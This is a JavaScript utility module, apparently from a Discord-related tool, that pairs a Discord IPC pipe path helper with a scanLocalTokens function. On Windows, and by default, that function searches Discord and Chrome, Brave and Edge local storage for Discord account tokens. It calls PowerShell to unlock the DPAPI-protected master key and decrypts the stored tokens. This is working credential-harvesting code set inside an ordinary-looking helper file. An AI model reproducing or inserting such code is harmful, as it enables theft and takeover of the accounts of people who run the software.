import fs from 'fs';
import path from 'path';
import os from 'os';
import crypto from 'crypto';
import { execSync } from 'child_process';

export const isWindows = process.platform === 'win32';
export const isLinux = process.platform === 'linux';
export const isDarwin = process.platform === 'darwin';

export function getIpcPipePath(index = 0) {
  if (isWindows) {
    return `\\\\?\\pipe\\discord-ipc-${index}`;
  }

  // Fallbacks Unix / Linux / MacOS
  const runtimeDir = process.env.XDG_RUNTIME_DIR;
  if (runtimeDir && fs.existsSync(runtimeDir)) {
    return path.join(runtimeDir, `discord-ipc-${index}`);
  }

  const uid = typeof process.getuid === 'function' ? process.getuid() : 1000;
  const userDir = `/run/user/${uid}`;
  if (fs.existsSync(userDir)) {
    return path.join(userDir, `discord-ipc-${index}`);
  }

  const tmpPath = path.join('/tmp', `discord-ipc-${index}`);
  return tmpPath;
}

export function canScanLocalTokens() {
  if (!isWindows) return false;
  if (process.env.ENABLE_TOKEN_SCAN === 'false') return false;
  return true;
}

let cachedLocalTokens = null;
let cachedLocalTokensTs = 0;

export function scanLocalTokens(forceRefresh = false) {
  if (!isWindows) return [];
  const now = Date.now();
  if (!forceRefresh && cachedLocalTokens && now - cachedLocalTokensTs < 60000) {
    return cachedLocalTokens;
  }

  const localAppData = process.env.LOCALAPPDATA || path.join(os.homedir(), 'AppData', 'Local');
  const roamingAppData = process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming');
  const foundTokens = new Set();

  const plainPaths = [
    path.join(roamingAppData, 'Discord', 'Local Storage', 'leveldb'),
    path.join(roamingAppData, 'discordcanary', 'Local Storage', 'leveldb'),
    path.join(roamingAppData, 'discordptb', 'Local Storage', 'leveldb'),
    path.join(localAppData, 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb'),
    path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Storage', 'leveldb'),
    path.join(localAppData, 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Storage', 'leveldb'),
  ];

  const plainRegex = /[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,38}/g;
  for (const p of plainPaths) {
    if (!fs.existsSync(p)) continue;
    try {
      for (const file of fs.readdirSync(p)) {
        if (!file.endsWith('.log') && !file.endsWith('.ldb')) continue;
        try {
          const matches = fs.readFileSync(path.join(p, file), 'utf8').match(plainRegex);
          if (matches) matches.forEach((t) => foundTokens.add(t));
        } catch {}
      }
    } catch {}
  }

  function getMasterKey(basePath) {
    const localStatePath = path.join(basePath, 'Local State');
    if (!fs.existsSync(localStatePath)) return null;
    try {
      const script = `Add-Type -AssemblyName System.Security; $ls = Get-Content '${localStatePath}' -Raw | ConvertFrom-Json; $enc = [Convert]::FromBase64String($ls.os_crypt.encrypted_key); $enc = $enc[5..($enc.Length-1)]; $key = [System.Security.Cryptography.ProtectedData]::Unprotect($enc, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser); [Convert]::ToBase64String($key);`;
      const out = execSync(`powershell -NoProfile -NonInteractive -Command "${script}"`, { stdio: 'pipe' })
        .toString()
        .trim();
      return Buffer.from(out, 'base64');
    } catch {
      return null;
    }
  }

  const appPaths = [
    path.join(roamingAppData, 'Discord'),
    path.join(roamingAppData, 'discordcanary'),
    path.join(roamingAppData, 'discordptb'),
  ];
  const encRegex = /dQw4w9WgXcQ:([^"'\s]+)/g;

  for (const basePath of appPaths) {
    const leveldbPath = path.join(basePath, 'Local Storage', 'leveldb');
    if (!fs.existsSync(leveldbPath)) continue;
    const masterKey = getMasterKey(basePath);
    if (!masterKey) continue;
    try {
      for (const file of fs.readdirSync(leveldbPath)) {
        if (!file.endsWith('.log') && !file.endsWith('.ldb')) continue;
        try {
          const content = fs.readFileSync(path.join(leveldbPath, file), 'utf8');
          let match;
          while ((match = encRegex.exec(content)) !== null) {
            try {
              const buf = Buffer.from(match[1], 'base64');
              const iv = buf.slice(3, 15);
              const payload = buf.slice(15);
              const tag = payload.slice(payload.length - 16);
              const data = payload.slice(0, payload.length - 16);
              const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
              decipher.setAuthTag(tag);
              foundTokens.add(decipher.update(data, 'binary', 'utf8') + decipher.final('utf8'));
            } catch {}
          }
        } catch {}
      }
    } catch {}
  }

  cachedLocalTokens = Array.from(foundTokens);
  cachedLocalTokensTs = Date.now();
  return cachedLocalTokens;
}
